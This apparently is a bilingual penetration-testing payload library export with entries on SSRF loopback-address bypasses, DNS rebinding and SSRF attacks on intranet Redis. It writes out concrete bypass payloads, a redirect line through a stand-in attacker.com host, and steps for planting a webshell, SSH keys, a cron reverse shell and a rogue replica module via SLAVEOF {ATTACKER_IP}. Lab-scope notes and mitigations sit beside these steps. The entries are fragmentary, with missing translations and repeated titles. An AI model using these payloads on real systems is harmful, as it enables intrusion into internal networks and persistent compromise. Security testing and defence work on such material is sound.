vulnerability.zh: 根因是校验器按原始字符串匹配而连接库按标准解析连接，两套规则不一致导致 0177.0.0.1、2130706433、[::1] 等等价表示与通配 DNS、重定向链都能落在被禁地址上；百分号编码与 CRLF 注入还会进一步改变解析结果。
vulnerability.en: The root cause is a mismatch between a validator matching raw strings and a connection library resolving per the standard: equivalent forms such as 0177.0.0.1, 2130706433, and [::1], plus wildcard DNS and redirect chains, all land on forbidden addresses; percent-encoding and CRLF injection further alter the parse.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步逐条提交八进制、整数、十六进制与 127.0.0.1.nip.io 变体，标准 127.0.0.1 被拦而某变体返回回环内容即确认缺口；第 2 步用 #@、\@ 等歧义 URL 观察请求落点；第 3 步经开放重定向跳回环；第 4 步用 sslip.io 验证主机名白名单绕过；第 5、6 步覆盖 IPv6 与百分号编码、空字节、CRLF 变体。命中拦截时查看 wafBypass。
exploitation.en: Use in Payload list order: step 1 submits octal, integer, hex, and 127.0.0.1.nip.io variants one by one — the canonical 127.0.0.1 blocked while a variant returns loopback content confirms the gap; step 2 observes request landing points with ambiguous URLs using #@ and \@; step 3 hops to loopback through an open redirect; step 4 proves hostname-allowlist bypass with sslip.io; steps 5 and 6 cover IPv6 plus percent-encoding, null-byte, and CRLF variants. On blocks, consult wafBypass.

mitigation.zh: 使用单一标准 URL 解析器，对解析后的全部地址做二进制分类并阻断回环、私网与保留段，拒绝 userinfo/fragment 混淆与非规范 IP 字面量；在重定向与每次 DNS 解析后复检。修复后用第 1、5 步样例回归，所有等价表示都应被统一拒绝。
mitigation.en: Use a single standard URL parser, classify all resolved addresses in binary form, block loopback, private, and reserved ranges, and reject userinfo/fragment confusion and non-canonical IP literals; recheck after redirects and every DNS resolution. After the fix, regress with the step 1 and step 5 samples: all equivalent forms must be uniformly denied.

title.zh: 进制变形绕过回环黑名单
title.en: Bypass loopback blacklists with radix variants

description.zh: 提交 http://0177.0.0.1 等八进制、十进制、十六进制回环写法；任一变形返回内网内容即黑名单按字面匹配、可被绕过。
description.en: Submit octal, decimal and hexadecimal loopback spellings such as http://0177.0.0.1; any variant returning intranet content shows the blacklist matches literals and can be bypassed.

description.zh: 继续尝试 0x7f.0.0.1、0177.0.0.1、127.000.000.001 等混合写法；命中与 127.0.0.1 相同的响应即锁定最稳定的绕过形式备用。
description.en: Keep trying mixed forms like 0x7f.0.0.1, 0177.0.0.1 and 127.000.000.001; one matching the 127.0.0.1 response is the most reliable bypass to reuse.

title.zh: 构造 URL 解析混淆

description.zh: 提交含 @ 与片段的 http://{LAB_OAST}#@127.0.0.1/ 类地址；服务端实际请求回环而 OAST 无命中即解析器分歧被利用。
description.en: Submit @-and-fragment URLs like http://{LAB_OAST}#@127.0.0.1/; the server fetching loopback while OAST stays silent means parser divergence is exploited.

title.zh: 重定向与通配 DNS 回访内网
title.en: Re-enter via redirect and wildcard DNS

description.zh: 提交指向己方的 redirect?url=http://127.0.0.1 跳转地址，或 127.0.0.1.sslip.io 通配域名；服务端跟随跳转并返回内网内容即绕过成功。
description.en: Submit an attacker-owned redirect?url=http://127.0.0.1 URL or the 127.0.0.1.sslip.io wildcard domain; the server following the redirect and returning intranet content confirms the bypass.

title.zh: IPv6 与百分号编码收尾
title.en: Finish with IPv6 and percent encoding

description.zh: 提交 http://[::1] 与 http://%31%32%37%2e%30%2e%30%2e%31；返回与回环一致的内容即补齐绕过矩阵，后续统一换用可达变形。
description.en: Submit http://[::1] and http://%31%32%37%2e%30%2e%30%2e%31; responses matching loopback complete the bypass matrix for later reuse.

analysis.zh: SSRF 地址规范化回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF Address Canonicalization Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 对等价地址、用户信息、IPv6 和重定向执行统一解析后分类，不维护可直接用于真实内网的绕过清单。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

title.zh: 进制变形回环地址绕过
title.en: SSRF Address Canonicalization Regression Cleaned Command 1

description.zh: 逐条提交八进制、整数、十六进制与通配 DNS 回环变体并对比拦截；过滤拦截 127.0.0.1 而某变体返回回环内容，即确认地址规范化缺口。
description.en: Submit octal, integer, hex, and wildcard-DNS loopback variants; a variant returning loopback content while 127.0.0.1 is blocked confirms an address-canonicalization gap.

explanation.en: Describes how the value segment "2130706433" participates in this validation command.

description.zh: 提交解析器差异 URL 并对比请求落点；带外域名收到回连或返回歧义内容，即确认解析歧义绕过过滤。
description.en: Submit parser-differential URLs and compare request destinations; an out-of-band hit or ambiguous content confirms parsing ambiguity bypasses the filter.

title.en: SSRF Address Canonicalization Regression Cleaned Command 3

description.zh: 经开放重定向跳转到回环地址；取回器跟随跳转并返回 127.0.0.1 内容，即确认重定向链绕过成立。
description.en: Chain an open redirect to a loopback address; the fetcher following the redirect and returning 127.0.0.1 content confirms redirect-chain bypass.

syntaxBreakdown.part:
http://attacker.com/redirect?url=http://127.0.0.1
使用短链接服务重定向到内网

title.zh: 通配 DNS 回环域名绕过
title.en: SSRF Address Canonicalization Regression Cleaned Command 4

description.zh: 提交 sslip.io 与 nip.io 回环域名；解析到回环且返回内容，即确认主机名白名单可被通配 DNS 绕过。
description.en: Submit sslip.io and nip.io loopback names; resolution to loopback with returned content confirms wildcard-DNS bypass of hostname allowlists.

explanation.zh: sslip.io 与 nip.io 将内嵌 IP 恒定解析回该 IP（此处 127.0.0.1），用于绕过基于字符串黑名单的内网地址检查；两者不做交替解析，并非 DNS 重绑定服务（真实重绑定行为见 cmdi2-rbndr-us）
explanation.en: sslip.io and nip.io constantly resolve the embedded IP (here 127.0.0.1), bypassing string-blacklist checks for internal addresses; they never alternate and are not DNS rebinding services (see cmdi2-rbndr-us for real rebinding behavior)

title.en: SSRF Address Canonicalization Regression Cleaned Command 5

description.zh: 逐条提交 IPv6 回环变体；任一形式返回回环内容而标准 127.0.0.1 被拦，即确认 IPv6 过滤缺口。
description.en: Submit each IPv6 loopback variant; a form returning loopback content while 127.0.0.1 is blocked confirms an IPv6 filtering gap.

title.zh: 百分号编码与 CRLF 变形
title.en: SSRF Address Canonicalization Regression Cleaned Command 6

description.zh: 提交百分号编码、空字节与 CRLF 变体；某变体使解析器拆分出回环目标或注入 Host 头，即确认编码与 CRLF 缺口。
description.en: Submit percent-encoding, null-byte, and CRLF variants; a variant splitting the parser toward a loopback target or injecting a Host header confirms encoding and CRLF gaps.

title.zh: 混合进制 IP 变体
title.en: SSRF Address Canonicalization Regression Cleaned Command 1

description.zh: 提交混合进制 IP 变体；任一形式解析为 127.0.0.1 且被取回，即确认进制规范化缺口。
description.en: Submit mixed-radix IP variants; any form resolving to 127.0.0.1 and fetched confirms a radix-normalization gap.

title.zh: 解析差异与进制变形综合测试

description.zh: 逐条提交解析差异 payload 并记录响应与请求落点；成功时过滤器拦截标准 127.0.0.1 而某变体仍取回回环内容，即确认规范化缺口。
description.en: Submit each parser-differential payload and record responses and request destinations; a variant fetching loopback content while canonical 127.0.0.1 is blocked confirms the normalization gap.

title.zh: 扩展变体补充测试（sslip.io 等）

description.zh: 与上一组互补的扩展验证：在综合变体基础上补充 sslip.io 通配域名等表示，逐条记录请求落点；任一变体取回回环内容而标准 127.0.0.1 被拦，即确认过滤缺口覆盖同类等价表示。
description.en: Submit each extended variant and record responses and request destinations; any variant (including sslip.io) bypassing the filter to fetch loopback content confirms the same class of gap.

name.zh: SSRF DNS 重解析固定验证

description.zh: 覆盖 DNS 重绑定攻击的 TOCTOU 窗口验证：从重绑定域名两次解析结果对照，到公共重绑定与通配域名投递，再到自建交替解析器复现，用于确认服务端是否固定首次解析结果。
description.en: Covers TOCTOU window validation for DNS rebinding attacks: from first-versus-second resolution comparison of rebinding domains through delivery of public rebinding and wildcard domains to reproduction with a self-run alternating resolver, confirming whether the server pins the first resolution.

subCategory.zh: 地址变形与 DNS 解析绕过

prerequisites.zh: 确认 SSRF DNS 重解析固定验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF DNS Re-Resolution Pinning Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF DNS 重解析固定验证覆盖 DNS 重绑定 TOCTOU 场景：针对先解析校验、后连接的服务端取回功能，验证两次 DNS 解析结果不一致时的防护缺口。验证维度包含重绑定域名双次解析对照、公共重绑定域名投递与自建交替解析器复现。
overview.en: SSRF DNS Re-Resolution Pinning Validation covers the DNS rebinding TOCTOU scenario: for server-side fetchers that resolve-validate first and connect later, verify the protection gap when two DNS resolutions disagree. Verification dimensions include paired-resolution comparison on a rebinding domain, public rebinding service delivery, and reproduction with a self-hosted alternating resolver.

vulnerability.zh: 根因是应用只在首次解析后校验地址，连接或重试时重新解析却不固定结果；攻击者用交替返回外部与内网地址的权威 DNS 制造检查时与使用时差异，使校验通过的域名最终连入回环或私网目标。
vulnerability.en: The root cause is an application that validates only after the first resolution but re-resolves on connect or retry without pinning the result; an authoritative DNS alternating between external and internal answers creates a check-time versus use-time divergence, steering an approved hostname into loopback or private targets.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用重绑定域名发起 SSRF，首次返回合法地址、二次解析为内网地址且取回成功即确认窗口存在；第 2 步用 7f000001.cip.cc 与 nip.io 等公共域名复测 TOCTOU 缺口；第 3 步运行自建交替解析器，用其域名复现奇偶交替返回；第 4 步固定 DNS 与网络环境后复测，两次结果不一致即确认服务端未固定解析。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 launches SSRF with the rebinding domain — a legitimate first answer, an internal address on the second, and a successful fetch confirm the window; step 2 retests the TOCTOU gap with public domains such as 7f000001.cip.cc and nip.io; step 3 runs the self-hosted alternating resolver and reproduces odd/even alternation through its domain; step 4 retests with DNS and network pinned — mismatched results confirm the server never pinned the resolution. Replace placeholders via the global variables menu.

mitigation.zh: 校验并固定解析后的允许地址，连接时使用固定 IP 并保持正确 Host/SNI；重定向、重试与 DNS 刷新后重新执行完整地址分类，必要时限制解析缓存 TTL。修复后用第 1 步样例回归，两次解析不一致时连接应被直接拒绝。
mitigation.en: Validate and pin the approved resolved address, connect to the fixed IP with correct Host/SNI, and re-run full address classification after redirects, retries, and DNS refreshes, capping resolver cache TTL where needed. After the fix, regress with the step 1 sample: connections must be denied when the two resolutions disagree.

description.zh: 提交 http://{LAB_REBIND_DOMAIN}/；域名首次解析到攻击者 IP、再次解析到内网地址，且响应携带内网内容即重解析生效。
description.en: Submit http://{LAB_REBIND_DOMAIN}/; the domain resolving to the attacker IP first and an internal IP second, with intranet content returned, confirms rebinding works.

title.zh: 自建权威 DNS 控制解析
title.en: Run an authoritative DNS to steer resolution

description.zh: 运行 dnslib 脚本架设权威 DNS，对同一域名交替应答两个地址并压低 TTL；目标两次请求落到不同 IP 即掌控翻转节奏。
description.en: Run the dnslib script to host an authoritative DNS that alternates answers with low TTL; the target landing on different IPs per request means you control the flip timing.

description.zh: 用 7f000001.cip.cc、127.0.0.1.nip.io 等编码域名先行测试；域名解析到回环且内容可读即可立即推进内网探测，无需等待自建 DNS。
description.en: Test with encoded domains like 7f000001.cip.cc and 127.0.0.1.nip.io first; loopback resolution with readable content lets intranet probing start before your own DNS is ready.

description.zh: 固定应答序列与 TTL 后，把第 1 步载荷换为自建域名指向不同内网地址逐台打击；稳定返回各目标内容即重绑定通道规模化。
description.en: With the answer sequence and TTL fixed, repoint the step-1 payload's domain at different internal hosts one by one; steady content from each target scales the rebinding channel.

analysis.zh: SSRF DNS 重解析固定验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF DNS Re-Resolution Pinning Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 在双端均受控的重绑定夹具中比较校验和连接时的 DNS 答案，验证地址是否固定并重新分类。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

title.en: SSRF DNS Re-Resolution Pinning Validation Cleaned Command 1

description.zh: 用重绑定域名发起 SSRF 并记录两次解析结果；首次返回合法地址、二次返回内网地址且取回成功，即确认存在 DNS 重解析窗口。
description.en: Launch SSRF via the rebinding domain and record both resolutions; a legitimate first resolution followed by an intranet address on the second with a successful fetch confirms a DNS re-resolution window.

title.en: SSRF DNS Re-Resolution Pinning Validation Cleaned Command 2

description.zh: 逐条提交公共重绑定与通配域名；任一域名先解析公网、后解析回环并返回内容，即确认 TOCTOU 缺口。
description.en: Submit each public rebinding and wildcard domain; one resolving public first then loopback with returned content confirms a TOCTOU gap.

title.en: SSRF DNS Re-Resolution Pinning Validation Cleaned Command 3

description.zh: 运行交替解析器并用其域名发起 SSRF；解析日志显示奇偶交替返回 1.2.3.4 与 127.0.0.1，即确认重绑定行为可复现。
description.en: Run the alternating resolver and launch SSRF via its domain; logs alternating between 1.2.3.4 and 127.0.0.1 confirm reproducible rebinding.

description.en: Retest after pinning DNS and the network environment; differing resolutions with a successful second intranet connection confirm the server does not pin resolution results.

description.zh: 连续查询同一 A 记录并记录返回；两次查询返回不同地址即确认低 TTL 交替生效。
description.en: Query the same A record repeatedly; differing answers across queries confirm the low-TTL alternation.

wafBypass.command: http://rebind.{LAB_OAST}/  # A 记录: 外网IP + 内网IP 各一条

description.zh: 绕过对单条 A 记录缓存的有效性检查：多条记录轮询使两次连接命中不同地址；外部校验请求与内部请求均出现即成功。
description.en: Publish two A records so round-robin lands successive connections on different addresses; both an external validation hit and an internal request confirm success.

description.zh: 绕过对单端口探测的判定：不同端口分别触发解析时机差；一端口先出网校验另一端口命中内网即成功。
description.en: Probe different ports to shift resolution timing; one port validating out-of-band first while another hits the internal target confirms success.

wafBypass.command: nslookup rebind.{LAB_OAST}  # TTL=0，两次查询返回 127.0.0.1 与外部IP 交替

description.zh: 绕过 HTTP 层的出网记录：仅用 DNS 查询验证低 TTL 翻转行为；两次应答 IP 不同即重绑定能力成立。
description.en: Validate the low-TTL flip through DNS queries alone; alternating answers across two queries confirm rebinding capability.

description.en: Request each rebinding domain and record both resolutions; a legitimate first resolution followed by an intranet address on the second with a successful fetch confirms the low-TTL rebinding window.

description.zh: 绕过对固定顺序十六进制段的匹配：前后地址对调后服务在两次解析间切换目标；两次请求源 IP 不同即重绑定生效。
description.en: Swap the hex segments so resolution alternates between two targets past fixed-order matching; differing source IPs across requests confirm rebinding.

description.zh: 绕过只监控私网目标段的规则：一侧置零地址观察解析行为；DNS 应答在两值间变化即成功。

description.en: Attach port probes directly to the rebinding domain against default-port assumptions; distinguishable open/closed responses confirm success.

name.zh: SSRF Redis 可达性验证与保留持久化样例
name.en: SSRF Redis Reachability Validation and Retained Persistence Samples

description.zh: 覆盖 SSRF 打击内网 Redis 全链验证：从 dict/gopher 双通道可达性确认，到写入 WebShell、SSH 公钥与 Cron 反弹任务，再到 rogue server 主从模块加载，确认 Redis 暴露完整影响面。
description.en: Covers end-to-end validation of SSRF against intranet Redis: from dict/gopher dual-channel reachability confirmation through webshell, SSH public-key, and cron reverse-shell writes to rogue-server replication module loading, confirming the full impact of an exposed Redis.

prerequisites.zh: 确认 SSRF Redis PING 可达性验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Redis PING Reachability Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF Redis 可达性验证覆盖内网 Redis 全链路利用场景：针对可经 dict/gopher 触达 6379 端口的注入点，验证从协议可达确认到持久化落地的完整影响面。验证维度包含双通道可达性、WebShell/SSH 公钥/Cron 三种写入与 rogue server 主从模块加载。
overview.en: SSRF Redis Reachability Validation covers the full intranet-Redis exploitation chain: for injection points that can reach port 6379 via dict/gopher, verify the complete impact from protocol reachability to persistence. Verification dimensions include dual-channel reachability, three write primitives (WebShell, SSH public key, cron job), and rogue-server replica module loading.

vulnerability.zh: 根因是 Redis 绑定内网且未启用认证，SSRF 获取器允许 dict/gopher 直连 6379；Redis 接受 SET 与 CONFIG SET dir/dbfilename 组合后可把任意内容写盘，配合 SAVE 即落为 WebShell、authorized_keys 或 cron 任务，rogue 主从链路还能加载恶意模块。
vulnerability.en: The root cause is intranet-bound Redis running without authentication while the SSRF fetcher permits dict/gopher direct access to 6379; Redis accepts SET plus CONFIG SET dir/dbfilename, so arbitrary content is written to disk and, with SAVE, lands as a WebShell, authorized_keys, or a cron job, while the rogue replica chain can even load malicious modules.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 dict info 与 gopher PING 确认 Redis 可达；第 2 步按 set、config set dir/dbfilename、save 序列写 WebShell 并访问验证解析；第 3 步改写 authorized_keys 后用对应私钥登录 root；第 4 步写入 cron 任务等待反弹连接到达监听端口；第 5 步先经 SSRF 向目标 Redis 下发 SLAVEOF {ATTACKER_IP} 6379 指向 rogue server，再运行 redis-rogue-server.py 等待主从同步与模块推送，MODULE LOAD 日志出现即确认加载链（完成后执行 SLAVEOF NO ONE 恢复）。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 confirms Redis reachability with dict info and a gopher PING; step 2 writes a WebShell via the set, config set dir/dbfilename, and save sequence and verifies it parses; step 3 rewrites authorized_keys and logs in as root with the matching key; step 4 plants a cron job and waits for the reverse connection at your listener; step 5 runs the rogue server — MODULE LOAD logs plus completed replica sync confirm the loading chain. Replace placeholders via the global variables menu.

mitigation.zh: 获取器拒绝非 HTTP 协议并在解析后阻断内网目标；Redis 启用认证、TLS 与 ACL，用 rename-command 禁用 CONFIG/SAVE 危险组合，持久化目录不与 Web 根、SSH、cron 目录共享。修复后用第 1 步回归确认协议不可达，三类写入序列全部失败。
mitigation.en: Reject non-HTTP schemes in the fetcher and block intranet targets after resolution; enable Redis authentication, TLS, and ACLs, disable the CONFIG/SAVE combination via rename-command, and keep the persistence directory disjoint from the web root, SSH, and cron directories. After the fix, regress with the step 1 sample for protocol isolation; all three write sequences must fail.

title.zh: 确认 Redis 未授权可达

description.en: Submit dict://127.0.0.1:6379/info; version, memory and persistence details confirm unauthenticated access, and dir/dbfilename values locate the landing path.
